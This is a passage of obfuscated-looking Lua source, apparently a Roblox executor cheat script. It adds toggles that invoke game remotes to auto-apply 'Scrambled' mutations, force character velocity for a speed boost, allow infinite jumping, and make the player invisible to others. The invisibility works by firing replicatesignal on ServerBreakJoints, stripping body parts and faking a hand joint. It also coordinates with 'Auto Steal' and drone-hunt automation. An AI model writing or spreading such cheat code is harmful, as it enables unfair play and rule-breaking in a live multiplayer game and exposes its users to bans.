			if icon == nil then
				return ""
			end

			if tonumber(icon) then
				return "rbxassetid://" .. tostring(icon)
			end
			return tostring(icon)
		end

		local function fn37(arg)
			local v21 = fn24(arg and arg.AssetCategory)
			local rarity = type(v21) == "table" and v21.Rarity or nil
			local flag5 = type(rarity) == "table"
			local str3

			if flag5 then
				str3 = tostring(rarity.DisplayName or rarity._id or "")
			else
				str3 = flag5
			end

			return str3 or "", fn35(fn34(type(rarity) == "table" and rarity.Color or nil))
		end

		local function fn38(arg)
			if type(arg) ~= "table" then
				return "No egg selected"
			end
			local v21 = fn24(arg.AssetCategory)
			local flag5 = type(v21) == "table"

			if flag5 then
				flag5 = tostring(v21.DisplayName or arg.AssetCategory)
			end

			return flag5 or tostring(arg.AssetCategory)
		end

		local function fn39()
			local idle = tbl28[tbl29.State] or tbl28.idle

			if tbl29.Ui.Accent and type(tbl29.Ui.Accent.Set) == "function" then
				tbl29.Ui.Accent.Set({ Background = idle })
			end

			if tbl29.Ui.Title and type(tbl29.Ui.Title.Set) == "function" then
				tbl29.Ui.Title.Set({ Text = tbl29.Status, Color = idle })
			end

			if tbl29.Ui.Egg and type(tbl29.Ui.Egg.Set) == "function" then
				tbl29.Ui.Egg.Set({ Text = tbl29.Detail, Color = tbl29.RarityColor })
			end

			if tbl29.Ui.Meta and type(tbl29.Ui.Meta.Set) == "function" then
				tbl29.Ui.Meta.Set({
					Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", tbl29.Left, tbl29.Match, tbl29.Pen, tbl29.Tries, tbl29.Hits),
				})
			end

			if tbl29.Ui.Icon and type(tbl29.Ui.Icon.Set) == "function" then
				tbl29.Ui.Icon.Set({ Visible = tbl29.Icon ~= "", Image = tbl29.Icon, StrokeColor = tbl29.RarityColor })
			end

			if tbl29.Row and type(tbl29.Row.Set) == "function" then
				pcall(tbl29.Row.Set, tbl29.Row, tbl29.Status .. "  -  " .. tbl29.Detail)
			end
		end

		local function fn40(arg)
			if type(arg) ~= "table" then
				tbl29.Detail = "No egg matches the filters"
				tbl29.RarityColor = "#C7CBD6"
				tbl29.Icon = ""
				return
			end

			local v21, v22 = fn37(arg)
			local n16 = tonumber(arg.AssetScale) or 0
			tbl29.Detail = string.format("%s   %.2f kg", fn38(arg), n16)

			if v21 ~= "" then
				tbl29.Detail = tbl29.Detail .. "   " .. string.upper(v21)
			end

			tbl29.RarityColor = v22
			tbl29.Icon = fn36(arg)
		end

		tbl29.Apply = function(arg, arg2)
			if not tbl29.Grip(arg2) then
				tbl29.State = "work"
				tbl29.Status = "Could not hold Scrambled"
				tbl29.Cooldown = os.clock() + 2
				return false
			end

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

			if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
				tbl29.State = "stop"
				tbl29.Status = "Mutation remote is missing"
				tbl29.Cooldown = os.clock() + 10
				return false
			end

			tbl29.State = "work"
			tbl29.Status = "Applying Scrambled"
			tbl29.Tries = tbl29.Tries + 1

			local ok, result = pcall(function()
				return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
			end)

			if not ok or type(result) ~= "table" then
				tbl29.Cooldown = os.clock() + 10
				return false
			end

			if result.Success == true then
				tbl29.Status = "Scrambled applied"
				tbl29.Locked = nil
				tbl29.State = "good"
				tbl29.Hits = tbl29.Hits + 1
				return true
			end

			local str3 = tostring(result.Message or "")
			local v21 = string.lower(str3)
			tbl29.Status = str3 ~= "" and str3 or "Try failed"
			tbl29.State = "work"

			if string.find(v21, "not found") or string.find(v21, "invalid") then
				tbl29.Locked = nil
				tbl29.Cooldown = os.clock() + 3
				return false
			end

			return true
		end

		tbl29.Settle = function()
			local n16 = os.clock() + 3

			while os.clock() < n16 do
				if tbl3.Grounded() then
					return
				end
				RunService.Heartbeat:Wait()
			end
		end

		tbl29.Over = function(arg)
			if arg ~= tbl29.Loop or not tbl3.Toggle(tbl29.Handle, false) then
				return true
			end

			if tbl3.Movement.PlaceWanted == true then
				return true
			end
			return tbl3.Movement.ScrambleWanted == true or tbl3.Steal.Wanted == true
		end

		tbl29.Idle = function(status, detail, arg)
			tbl29.State = "idle"
			tbl29.Status = status
			tbl29.Left = 0
			tbl29.Detail = detail
			tbl29.RarityColor = "#C7CBD6"
			tbl29.Icon = ""
			tbl29.Cooldown = os.clock() + (arg or 5)
		end

		local function fn41(arg)
			if tbl3.Movement.ScrambleWanted == true or tbl3.Steal.Wanted == true then
				tbl29.State = "work"
				tbl29.Status = tbl3.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
				tbl29.Cooldown = os.clock() + 2
				return
			end

			local cooldown = tbl29.Cooldown
			if os.clock() < cooldown then
				return
			end
			local v21, v22 = fn31()

			if not v21 then
				pcall(fn33)
				if fn32() then
					tbl29.Cooldown = os.clock() + 0.5
					return
				end

				if tbl29.Short then
					tbl29.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
					return
				end

				if not string.find(tbl29.Status, "Samples", 1, true) then
					tbl29.Status = "Need a Scrambled consumable"
				end

				tbl29.Idle(tbl29.Status, "Buy Scrambled from the event shop", 5)
				return
			end

			tbl29.Left = v22
			local v23 = fn33()

			if not v23 or not v23.Uid then
				tbl29.State = "stop"
				tbl29.Status = "Waiting"
				fn40(nil)
				return
			end

			if tbl3.Movement.PlaceWanted == true then
				tbl29.State = "work"
				tbl29.Status = "Auto Place goes first"
				tbl29.Cooldown = os.clock() + 2
				return
			end

			if not tbl3.ClaimMovement("mutation") then
				tbl29.State = "work"
				tbl29.Status = "Waiting for " .. tostring(tbl3.Movement.Owner or "movement")
				tbl29.Cooldown = os.clock() + 2
				return
			end

			tbl3.Movement.MutationWanted = true

			local ok, result = pcall(function()
				while not tbl29.Over(arg) do
					local v24, v25 = fn31()

					if v24 then
						tbl29.Left = v25
						local v26 = fn33()

						if not v26 or not v26.Uid then
							tbl29.State = "stop"
							tbl29.Status = "Waiting"
							fn40(nil)
							break
						else
							if v26.Uid ~= tbl29.Locked then
								tbl29.Locked = v26.Uid
								tbl29.Status = "New target picked"
							end

							fn40(v26)

							if not fn29(v26, arg) then
								tbl29.State = "work"
								tbl29.Status = "Could not reach the egg"
								tbl29.Cooldown = os.clock() + 3
								break
							elseif not tbl29.Over(arg) then
								if tbl29.Apply(v26, v24) then
									pcall(fn39)
									task.wait(0.35)
									continue
								end
							end
						end
					end

					break
				end
			end)

			if not ok then
				tbl29.Status = "Stopped: " .. tostring(result)
				tbl29.State = "work"
				tbl29.Cooldown = os.clock() + 3
			end

			tbl29.Settle()
			tbl3.Movement.MutationWanted = false
			tbl3.ReleaseMovement("mutation")
		end

		tbl29.Handle = v9:CreateToggle({
			Name = "Auto Use Scrambled Mutation",
			Default = false,
			Callback = function(arg)
				tbl29.Loop = tbl29.Loop + 1
				tbl3.Movement.MutationWanted = false
				tbl3.ReleaseMovement("mutation")
				if arg ~= true then
					return
				end
				local loop = tbl29.Loop

				task.spawn(function()
					while loop == tbl29.Loop and tbl3.Toggle(tbl29.Handle, false) do
						pcall(fn41, loop)
						pcall(fn39)
						task.wait(tbl29.State == "idle" and 3 or 1)
					end
				end)
			end,
		})

		if type(v9.CreateCanvas) == "function" then
			local v21 = v9:CreateCanvas({
				Name = "Scrambled Status",
				ShowTitle = false,
				Layout = "free",
				SubOf = tbl29.Handle,
				Style = {
					TextScale = 1,
					LineHeight = 1.1,
					MinLines = 4,
					MaxLines = 4,
					AutoHeight = true,
					BackgroundTransparency = 0.35,
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(arg)
					tbl29.Ui.Card = arg:Frame({
						X = 0,
						Y = 0,
						Width = 1,
						Height = 3.6,
						Corner = 0.3,
						Background = "#151821",
						BackgroundTransparency = 0.25,
					})

					tbl29.Ui.Accent = arg:Frame({
						Parent = tbl29.Ui.Card,
						X = 0.08,
						Y = 0.18,
						Width = 0.16,
						Height = 3.24,
						Corner = 0.2,
						Background = tbl28.idle,
					})

					tbl29.Ui.Icon = arg:Image({
						Parent = tbl29.Ui.Card,
						X = 0.42,
						Y = 0.3,
						Width = 3,
						Height = 3,
						Corner = 0.3,
						Background = "#242938",
						BackgroundTransparency = 0.1,
						StrokeThickness = 0.06,
						StrokeTransparency = 0,
						Visible = false,
					})

					tbl29.Ui.Title = arg:Text({
						Parent = tbl29.Ui.Card,
						X = 3.7,
						Y = 0.32,
						Width = 1,
						Height = 1.05,
						Scale = 1.16,
						Wrap = false,
						Text = tbl29.Status,
						Color = tbl28.idle,
						TextStrokeTransparency = 1,
					})

					tbl29.Ui.Egg = arg:Text({
						Parent = tbl29.Ui.Card,
						X = 3.7,
						Y = 1.42,
						Width = 1,
						Height = 1,
						Scale = 1,
						Wrap = false,
						Text = tbl29.Detail,
						Color = "#FFFFFF",
						TextStrokeTransparency = 1,
					})

					tbl29.Ui.Meta = arg:Text({
						Parent = tbl29.Ui.Card,
						X = 3.7,
						Y = 2.42,
						Width = 1,
						Height = 0.9,
						Scale = 0.86,
						Wrap = false,
						Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
						Color = "#AEB4C6",
						TextStrokeTransparency = 1,
					})

					fn39()
				end,
			})

			fn4(function()
				pcall(function()
					v21:Destroy()
				end)
			end)
		else
			tbl29.Row = v9:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = tbl29.Handle })
		end
	end

	v9:CreateDropdown({
		Name = "Mutation Min Rarity",
		Note = "Only eggs of this rarity and above are used",
		Options = tbl11,
		Default = tbl11[1],
		SubOf = tbl29.Handle,
		Callback = function(arg)
			tbl29.MinRarity = tbl12[arg] or 0
		end,
	})

	do
		local tbl30 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local tbl31 = { Slider = nil, Value = 0, Unit = "M/s" }

		local function fn30(arg, arg2)
			if arg ~= nil then
				tbl31.Value = math.max(0, math.floor(tonumber(arg) or tbl31.Value))
			end

			if arg2 ~= nil then
				tbl31.Unit = tostring(arg2)
			end

			tbl29.MinIncome = tbl31.Value * (tbl30[tbl31.Unit] or tbl30["M/s"]).Mult
		end

		tbl31.Slider = v9:CreateSlider({
			Name = "Mutation Min Value",
			Note = "Skip eggs worth less than this (0 = off)",
			Min = 0,
			Max = 1000,
			Default = 0,
			AllowDecimals = false,
			Increment = 1,
			SubOf = tbl29.Handle,
			Unit = {
				Default = "M/s",
				Selector = true,
				Options = { "K/s", "M/s", "B/s" },
				ColorEnabled = true,
				Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
				Callback = function(arg)
					local ms = tbl30[arg] or tbl30["M/s"]
					local slider = tbl31.Slider

					if slider and slider.SetRange then
						slider:SetRange(ms.Min, ms.Max)
						local min = tonumber(slider:Get()) or ms.Min
						local min2 = ms.Min
						local max = ms.Max
						local n16 = math.clamp(math.floor(min + 0.5), min2, max)

						if n16 ~= min then
							tbl31.Unit = tostring(arg)
							slider:Set(n16)
							return
						end

						fn30(n16, arg)
					else
						fn30(nil, arg)
					end
				end,
			},
			Callback = function(arg)
				fn30(arg, nil)
			end,
		})
	end

	v9:CreateDropdown({
		Name = "Mutation Priority",
		Note = "Which egg gets the consumable first",
		Options = tbl27,
		Default = tbl27[1],
		SubOf = tbl29.Handle,
		Callback = function(arg)
			tbl29.Priority = tostring(arg)
		end,
	})

	fn5(v9:CreateMultiDropdown({
		Name = "Mutation Target Eggs",
		Note = "Only use the consumable on these eggs (empty = all)",
		Options = tbl29.EggOptions,
		Default = {},
		SubOf = tbl29.Handle,
		Callback = function(arg)
			local targets = {}

			if type(arg) == "table" then
				for k, v21 in pairs(arg) do
					k = v21 == true and type(k) == "string" and k

					if k then
						v21 = k
					else
						v21 = type(v21) == "string" and v21
					end

					v21 = v21 or nil

					if v21 and tbl29.EggCategory[v21] then
						targets[tbl29.EggCategory[v21]] = true
					end
				end
			end

			tbl29.Targets = targets
		end,
	}))

	tbl29.BuyHandle = v9:CreateToggle({
		Name = "Auto Buy Scrambled",
		Note = "Buy another Scrambled from the event shop when you run out",
		Default = false,
		SubOf = tbl29.Handle,
		Callback = function()
			tbl29.Cooldown = 0
		end,
	})

	fn4(function()
		tbl29.Loop = tbl29.Loop + 1
		tbl3.Movement.MutationWanted = false
		tbl3.ReleaseMovement("mutation")
	end)

	v9:CreateButton({
		Name = "Go To Secret Cave",
		ButtonText = "Go",
		ConfirmText = "Going",
		Callback = function()
			task.spawn(fn23)
		end,
	})

	do
		local n16 = nil
		local flag5 = false
		local flag6 = false

		tbl2.Add(function()
			if not flag6 and os.clock() - n12 >= n9 then
				flag6 = true

				task.spawn(function()
					pcall(fn10, true)
					flag6 = false
				end)
			end

			if v17 and type(v17.Set) == "function" then
				pcall(v17.Set, v17, fn14())
			end

			if v18 and type(v18.Set) == "function" then
				pcall(v18.Set, v18, fn18())
			end

			local v21 = fn13()
			local v22 = tbl3.IsNight()

			if v21 and not flag5 then
				tbl25.Latch = v22
				tbl25.Ended = false
			end

			if not v22 then
				tbl25.Latch = false
			elseif v21 and not tbl25.Latch and not tbl25.Ended then
				tbl25.Ended = true
				str2 = "Night arrived, this outbreak is over"
				table.clear(tbl23)
				table.clear(tbl24)
			end

			if not v21 then
				tbl25.Ended = false
			end

			if flag5 and not v21 then
				task.delay(15, function()
					if not fn13() then
						table.clear(tbl23)
						table.clear(tbl26)
					end
				end)
			end

			flag5 = v21

			if tbl3.Toggle(v19, false) and not flag4 and os.clock() >= n15 and fn12() then
				flag4 = true
				n15 = os.clock() + 8

				task.spawn(function()
					pcall(fn16, function()
						return not tbl3.Toggle(v19, false)
					end)

					flag4 = false
				end)
			end

			local v23 = fn19()
			local v24 = fn20()
			tbl3.Movement.ScrambleWanted = v23 or v24
			local invisibilityHandle = tbl3.InvisibilityHandle
			local flag7 = invisibilityHandle ~= nil and tbl3.Toggle(invisibilityHandle, false)

			if v23 then
				n16 = nil

				if not tbl3.InvisSuspended then
					tbl3.InvisSuspended = true
					flag7 = flag7 and type(v.Notify) == "function"

					if flag7 then
						pcall(v.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
					end
				end
			elseif tbl3.InvisSuspended and not flag3 then
				n16 = n16 or os.clock() + 5

				if os.clock() >= n16 then
					n16 = nil
					tbl3.InvisSuspended = false

					if flag7 and type(v.Notify) == "function" then
						pcall(v.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
					end
				end
			end

			local character = localPlayer.Character
			if v23 and not flag3 and character and character:GetAttribute("InvisApplied") == true then
				str2 = "Leaving Invisibility for the hunt"
				return true
			end

			if flag3 then
				return v23
			end

			if not (v23 or v24) or os.clock() < n14 then
				if not v23 and not v24 then
					str2 = ""
				end

				return false
			end

			local steal = tbl3.Steal
			if steal.Active or steal.Carrying or steal.Wanted then
				str2 = "Auto Steal goes first"
				return v23
			end

			if not tbl3.ClaimMovement("scramble") then
				str2 = "Waiting for " .. tostring(tbl3.Movement.Owner or "movement") .. " to finish"
				return v23
			end
			flag3 = true
			n14 = os.clock() + n10
			local v25 = n13

			task.spawn(function()
				pcall(fn22, function()
					return v25 ~= n13
				end)

				tbl3.HoldBelt()
				pcall(fn21, v25)
				fn17()
				tbl3.ReleaseBelt()
				tbl3.ReleaseMovement("scramble")
				flag3 = false
				tbl2.Wake()
			end)

			return v23
		end)
	end

	fn4(function()
		n13 += 1
		fn17()
		tbl3.InvisSuspended = false
		tbl3.Movement.ScrambleWanted = false
		tbl3.ReleaseMovement("scramble")
	end)

	local v21

	do
		local v22 = v2:CreateTab({ Name = "Player", SectionsExpanded = true })
		tbl3.EspSection = v22:CreateSection({ Name = "ESP", Expanded = false })
		local v23 = v22:CreateSection({ Name = "Movement", Expanded = true })
		v21 = v22:CreateSection({ Name = "Character", Expanded = true })
		local createToggle = nil
		local n16 = 350
		local connection = nil
		local flag5 = false

		local function fn30()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			character = character and character:FindFirstChildOfClass("Humanoid")
			if humanoidRootPart and character and character.Health > 0 then
				return humanoidRootPart, character
			end
			return nil, nil
		end

		local function fn31()
			if not flag5 then
				return
			end
			flag5 = false
			local v24, v25 = fn30()
			if not v24 then
				return
			end
			local assemblyLinearVelocity = v24.AssemblyLinearVelocity
			local moveDirection = v25.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
			local vector2 = vector.Magnitude > 0.001 and vector.Unit * v25.WalkSpeed or Vector3.zero

			pcall(function()
				v24.AssemblyLinearVelocity = Vector3.new(vector2.X, assemblyLinearVelocity.Y, vector2.Z)
			end)
		end

		local function fn32()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			fn31()
			tbl3.Shield("speed", false)
		end

		local function fn33()
			if connection then
				return
			end
			tbl3.Shield("speed", true)

			connection = RunService.Heartbeat:Connect(function()
				if tbl3.Steal.Active or tbl3.Flying or tbl3.Driving > 0 or tbl3.Treadmill.Riding then
					flag5 = false
					return
				end
				local v24, v25 = fn30()
				if not v24 or v25.Sit or v25.PlatformStand then
					flag5 = false
					return
				end
				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if num and num > workspace:GetServerTimeNow() then
					flag5 = false
					return
				end
				local moveDirection = v25.MoveDirection
				local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
				if vector.Magnitude <= 0.001 then
					fn31()
					return
				end
				local n17 = vector.Unit * n16
				local assemblyLinearVelocity = v24.AssemblyLinearVelocity

				pcall(function()
					v24.AssemblyLinearVelocity = Vector3.new(n17.X, assemblyLinearVelocity.Y, n17.Z)
				end)

				flag5 = true
			end)
		end

		tbl3.SpeedForced = false

		local function fn34()
			if tbl3.Toggle(createToggle, false) or tbl3.SpeedForced then
				fn33()
			else
				fn32()
			end
		end

		local flag6 = false
		local flag7 = false
		local flag8 = false

		tbl3.SetSpeedForced = function(arg)
			tbl3.SpeedForced = arg == true
			flag6 = true
			fn34()
		end

		local tbl30 = {
			Name = "Speed Boost",
			Default = false,
			Callback = function()
				if tbl3.SpeedForced and not tbl3.Toggle(createToggle, false) then
					flag6 = true
					flag8 = true
				end

				fn34()
			end,
		}

		createToggle = v23.CreateToggle
		createToggle = createToggle(v23, tbl30)

		local connection2 = RunService.Heartbeat:Connect(function()
			if flag8 then
				flag8 = false

				if type(v.Notify) == "function" then
					pcall(v.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
				end
			end

			if not flag6 then
				return
			end
			flag6 = false
			local flag9

			if tbl3.SpeedForced and not tbl3.Toggle(createToggle, false) then
				flag7 = true
				flag9 = true
			else
				local flag10 = not tbl3.SpeedForced and flag7
				flag9 = nil

				if flag10 then
					flag7 = false
					flag9 = nil

					if tbl3.Toggle(createToggle, false) then
						flag9 = false
					end
				end
			end

			if flag9 ~= nil then
				for _, v24 in ipairs({ "Set", "SetValue" }) do
					local ok, result = pcall(function()
						return createToggle[v24]
					end)

					if not (ok and type(result) == "function" and pcall(result, createToggle, flag9)) then
						continue
					end
					break
				end
			end
		end)

		fn4(function()
			connection2:Disconnect()
		end)

		v23:CreateSlider({
			Name = "Boost Speed",
			Min = 20,
			Max = 1000,
			Default = 350,
			Increment = 5,
			Unit = "studs/s",
			Callback = function(arg)
				n16 = math.clamp(tonumber(arg) or 350, 20, 1000)
			end,
		})

		fn4(fn32)
		local v24 = nil
		local connection3 = nil

		local function fn35()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			tbl3.Shield("jump", false)
		end

		v24 = v23:CreateToggle({
			Name = "Infinite Jump",
			Default = false,
			Callback = function()
				if not tbl3.Toggle(v24, false) then
					fn35()
					return
				end

				if connection3 then
					return
				end
				tbl3.Shield("jump", true)

				connection3 = UserInputService.JumpRequest:Connect(function()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						pcall(function()
							humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end)
					end
				end)
			end,
		})

		fn4(fn35)
	end

	local createToggle
	createToggle = nil
	local flag5
	flag5 = false
	local flag6
	flag6 = true

	do
		local flag7 = false
		local flag8 = false
		local flag9 = false
		local v22 = nil
		local v23 = nil
		local hipHeight = 999

		local function fn30()
			return flag5 and not tbl3.InvisSuspended
		end

		local function fn31(arg)
			return arg and arg:FindFirstChildOfClass("Humanoid") or nil
		end

		local function fn32(arg)
			return networking:FindFirstChild(arg)
		end

		local function fn33(arg)
			return arg ~= nil and arg:GetAttribute("InvisApplied") == true
		end

		local function fn34()
			local AskDoff = fn32("RF/Treadmill/AskDoff")

			if AskDoff and AskDoff:IsA("RemoteFunction") then
				for i = 1, 2 do
					pcall(AskDoff.InvokeServer, AskDoff)
				end
			end
		end

		local function fn35(arg)
			local AskRigWipe = fn32("RE/RigSync/AskRigWipe")

			if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
				pcall(AskRigWipe.FireServer, AskRigWipe, arg)
			end
		end

		local function fn36(arg)
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					pcall(child.UnequipTools, child)
				end
			end

			if backpack then
				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("Tool") then
						pcall(function()
							child.Parent = backpack
						end)
					end
				end
			end

			for i = 1, 3 do
				RunService.Heartbeat:Wait()
			end
		end

		local function fn37(arg)
			local v24 = fn31(arg)
			if not arg or not v24 then
				return false
			end
			fn36(arg)
			fn34()

			pcall(function()
				v24:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
				v24.BreakJointsOnDeath = true
				v24.RequiresNeck = true
				v24.Health = 0
			end)

			pcall(function()
				v24:ChangeState(Enum.HumanoidStateType.Dead)
			end)

			pcall(function()
				arg:BreakJoints()
			end)

			fn35(arg)
			return true
		end

		local function fn38(parent)
			local v24 = fn31(parent)
			local n16 = os.clock() + 10

			while true do
				if os.clock() < n16 and flag6 and parent.Parent then
					v24 = v24 or fn31(parent)
					if not (v24 and parent:FindFirstChild("HumanoidRootPart") and parent:FindFirstChild("Head")) then
						task.wait()
						continue
					end
				end

				break
			end

			local humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
			if not fn30() or not v24 or not humanoidRootPart or not parent:FindFirstChild("Head") then
				return false
			end
			task.wait(0.05)
			if not fn30() or parent.Parent == nil then
				return false
			end

			for i = 1, 2 do
				pcall(v24.UnequipTools, v24)
			end

			if type(replicatesignal) == "function" then
				for i = 1, 2 do
					pcall(replicatesignal, v24.ServerBreakJoints)
				end
			end

			local hipHeight2 = v24.HipHeight

			pcall(function()
				v24.HipHeight = hipHeight
			end)

			for _, child in ipairs(parent:GetChildren()) do
				if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
					pcall(function()
						child.Parent = nil
					end)
				end
			end

			task.wait(0.12)

			local function fn39()
				pcall(function()
					v24.HipHeight = hipHeight2
				end)

				for _, child in ipairs(parent:GetChildren()) do
					if child:IsA("Humanoid") and child.HipHeight ~= hipHeight2 then
						pcall(function()
							child.HipHeight = hipHeight2
						end)
					end
				end
			end

			if parent.Parent == nil then
				fn39()
				return false
			end
			local motor6D = Instance.new("Motor6D")
			motor6D.Name = "RightWrist"
			motor6D.C0 = CFrame.new(1.2, 0, 0)
			motor6D.C1 = CFrame.new()
			motor6D.Part0 = humanoidRootPart
			motor6D.Parent = humanoidRootPart
			local part = Instance.new("Part")
			part.Name = "RightHand"
			part.Size = Vector3.new(0.2, 0.2, 0.2)
			part.Transparency = 1
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CFrame = humanoidRootPart.CFrame * motor6D.C0
			motor6D.Part1 = part
			part.Parent = parent

			pcall(function()
				humanoidRootPart.CanCollide = false
			end)

			fn39()
			parent:SetAttribute("InvisApplied", true)

			task.delay(1, function()
				local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper

				if parent.Parent and type(chilliToolKeeper) == "function" then
					pcall(chilliToolKeeper)
				end
			end)

			task.delay(0.2, function()
				if humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart.CanCollide = true
					end)
				end
			end)

			local connection = parent.ChildAdded:Connect(function(child)
				if child:IsA("Humanoid") then
					task.defer(function()
						if child.HipHeight ~= hipHeight2 then
							pcall(function()
								child.HipHeight = hipHeight2
							end)
						end
					end)
				end
			end)

			local connection2 = nil

			connection2 = parent.AncestryChanged:Connect(function(child, parent2)
				if parent2 == nil then
					connection:Disconnect()
					connection2:Disconnect()
				end
			end)

			return true
		end

		local function fn39()
			local active = tbl3.Steal.Active or tbl3.Steal.Carrying or tbl3.Flying

			if not active then
				active = (tbl3.Driving or 0) > 0
			end

			return active
		end

		tbl3.RequestRespawn = function()
			flag9 = true
		end

		local function fn40()
			flag7 = true
			local v24 = flag9

			while flag6 and (fn39() or not tbl3.ClaimMovement("invisibility")) do
				task.wait(0.2)
			end

			local character = localPlayer.Character
			local v25 = flag6
			local v26

			if flag6 then
				v26 = character
			else
				v26 = v25
			end

			if v26 and (v24 or fn33(character) ~= fn30()) and fn31(character) then
				flag9 = false
				tbl10.Paused = true
				tbl3.ShieldPaused = true
				pcall(tbl3.UndoSwap)
				task.wait()
				fn37(localPlayer.Character)
				local n16 = os.clock() + 60
				local n17 = os.clock() + 8

				while flag6 and os.clock() < n16 and localPlayer.Character == character do
					if os.clock() >= n17 then
						n17 = os.clock() + 8
						fn35(character)
					end

					task.wait(0.05)
				end

				task.wait(0.1)

				while flag6 and flag8 do
					task.wait(0.05)
				end
			end

			tbl10.Paused = false
			tbl3.ShieldPaused = false
			tbl3.ReleaseMovement("invisibility")
			flag7 = false
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if not fn30() then
				return
			end
			flag8 = true
			tbl3.ShieldPaused = true

			task.spawn(function()
				pcall(fn38, character)
				flag8 = false

				if not flag7 then
					tbl3.ShieldPaused = false
				end
			end)
		end)

		local thread = task.spawn(function()
			while flag6 do
				local character = localPlayer.Character
				local v24 = fn31(character)
				local flag10 = not flag7 and not flag8 and character and v24 and v24.Health > 0
				local flag11

				if flag10 then
					local v25 = flag9

					if flag9 then
						flag11 = v25
					else
						flag11 = fn33(character) ~= fn30()
					end
				else
					flag11 = flag10
				end

				if flag11 then
					fn40()
				end

				local v25 = fn33(localPlayer.Character)

				if v25 ~= v22 then
					v22 = v25
					tbl3.SetSpeedForced(v25)
				end

				task.wait(0.25)
			end
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			if not character or not fn33(character) then
				return
			end
			local rightHand = character:FindFirstChild("RightHand")
			local tool = character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not rightHand or not handle or not handle:IsA("BasePart") then
				return
			end
			local cframe = CFrame.new()

			for _, child in ipairs(rightHand:GetChildren()) do
				if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
					cframe = child.C0 * child.C1:Inverse()

					if child.Enabled then
						child.Enabled = false
					end
				end
			end

			pcall(function()
				handle.CFrame = rightHand.CFrame * cframe
				handle.AssemblyLinearVelocity = Vector3.zero
				handle.AssemblyAngularVelocity = Vector3.zero
			end)
		end)

		fn4(function()
			connection2:Disconnect()
		end)

		local connection3 = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local v24 = fn31(character)
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			if not v24 or not humanoidRootPart or v24.Health <= 0 then
				return
			end
			local flag10 = fn33(character) and not tbl3.Steal.Active and not tbl3.Flying
			local flag11

			if flag10 then
				flag11 = (tbl3.Driving or 0) == 0
			else
				flag11 = flag10
			end

			if flag11 then
				flag11 = not (tbl3.Treadmill and tbl3.Treadmill.Riding)
			end

			if not (flag11 and not v24.Sit and not v24.PlatformStand) then
				if v23 == v24 then
					v23 = nil

					pcall(function()
						v24.AutoRotate = true
					end)
				end

				return
			end

			if v24.AutoRotate then
				pcall(function()
					v24.AutoRotate = false
				end)
			end

			v23 = v24
			local moveDirection = v24.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)

			if vector.Magnitude > 0.01 then
				pcall(function()
					humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
				end)
			end
		end)

		local tbl30 = {
			Name = "Invisibility",
			Note = "Makes you invisible to other players",
			Default = false,
			Callback = function()
				flag5 = tbl3.Toggle(createToggle, false) == true

				if fn30() and not fn33(localPlayer.Character) and tbl3.Movement.Owner == nil then
					tbl3.Movement.Owner = "invisibility"
				end
			end,
		}

		createToggle = v21.CreateToggle
		createToggle = createToggle(v21, tbl30)
		tbl3.InvisibilityHandle = createToggle

		fn4(function()
			flag6 = false
			connection:Disconnect()
			connection3:Disconnect()
			pcall(task.cancel, thread)
			tbl10.Paused = false
			tbl3.ShieldPaused = false
			tbl3.ReleaseMovement("invisibility")
		end)
	end

	local tbl30
	tbl30 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }
	local tbl31

	tbl31 = {
		[Enum.HumanoidStateType.Physics] = true,
		[Enum.HumanoidStateType.Ragdoll] = true,
		[Enum.HumanoidStateType.FallingDown] = true,
	}

	local n16
	n16 = 0.5
	local v22, fn30, v23, flag7, connection, n17, fn31, tbl32, tbl33, n18
